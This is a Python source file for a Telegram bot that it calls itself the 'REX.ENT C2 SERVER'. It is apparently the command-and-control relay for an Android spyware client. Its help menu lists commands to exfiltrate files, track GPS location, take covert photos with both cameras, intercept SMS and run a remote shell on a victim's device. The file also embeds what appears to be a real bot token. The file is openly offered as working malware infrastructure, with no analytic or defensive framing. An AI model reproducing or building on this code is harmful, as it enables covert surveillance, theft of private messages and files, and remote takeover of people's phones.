import telebot
import os

# Configuration
TOKEN = "8739367697:AAELUfIpX0mU3rcokQQiAywGYMhvpj2ickg"
ADMIN_ID = 8601209747  # Replace with your ID

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if message.chat.id == ADMIN_ID:
        help_text = """
🚀 REX.ENT C2 SERVER ACTIVE

/info - Get Device Specs
/ls [path] - List Files
/download [path] - Exfiltrate File
/location - Track GPS
/photo_front - Front Cam Snap
/photo_back - Back Cam Snap
/sms_list [n] - Intercept SMS
/shell [cmd] - Remote Shell
        """
        bot.reply_to(message, help_text)

@bot.message_handler(func=lambda message: message.chat.id == ADMIN_ID)
def relay_command(message):
    # This bot acts as a relay for the Android client
    # Commands are caught by the Android device polling getUpdates
    print(f"[*] Command relayed: {message.text}")

if __name__ == "__main__":
    print("[+] REX.ENT C2 Bot is running...")
    bot.polling()
